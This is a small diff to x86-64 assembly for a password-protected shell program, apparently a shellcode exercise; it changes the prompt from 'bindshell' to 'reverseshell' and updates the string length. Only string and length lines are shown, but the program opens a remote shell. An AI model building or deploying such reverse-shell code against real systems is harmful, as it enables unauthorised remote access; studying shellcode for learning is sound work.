@@ -4,7 +4,7 @@ section .text
 
 _start:
 	jmp socket
-	hello_world: db 'Enter your password to run your bindshell',0xA
+	hello_world: db 'Enter your password to run your reverseshell',0xA
 	password_wrong: db 'Incorrect Password',0xA
 	password_correct: db 'You have spawn a shell !',0xA
 
@@ -114,7 +114,7 @@ password:
 ;41                                                                                        
 ;>>>               
 
-        mov dl, 42                   ; size of hello_world
+        mov dl, 45                   ; size of hello_world
 
         syscall                 ; will prompt the strings 'Enter your password to run your bindshell'
 
